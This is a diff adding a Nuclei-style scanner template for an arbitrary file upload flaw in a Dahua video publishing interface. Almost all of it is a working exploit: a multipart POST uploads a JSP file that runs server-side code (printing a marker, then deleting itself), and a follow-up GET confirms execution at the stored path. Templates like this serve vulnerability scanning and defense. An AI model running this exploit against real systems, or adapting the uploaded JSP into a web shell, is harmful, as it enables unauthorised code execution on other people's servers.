@@ -1,0 +1,55 @@
+id: dahua-video-upload
+info:
+  name: 大华 video 接口 - 任意文件上传漏洞
+  author: secking
+  severity: high
+  reference:
+    - https://www.dahuatech.com/
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: dahua
+    product: dahua
+  tags: file-upload,vuln,dahua
+variables:
+  rStr1: '{{md5(to_lower(rand_text_alpha(8)))}}'
+  rStr2: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/publishing/publishing/material/file/video'
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
+    body: |
+      --dd8f988919484abab3816881c55272a7
+      Content-Disposition: form-data; name="Filedata"; filename="{{rStr2}}.jsp"
+
+      <% out.println("{{rStr1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      --dd8f988919484abab3816881c55272a7
+      Content-Disposition: form-data; name="Submit"
+
+      submit
+      --dd8f988919484abab3816881c55272a7--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "\"success\":true") && contains(body, ".jsp")'
+        internal: true
+    extractors:
+      - type: regex
+        name: path
+        part: body
+        group: 1
+        regex:
+          - '\"path\":\"(.+?).jsp\"}'
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/publishingImg/{{path}}.jsp'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && regex(rStr1, body)'
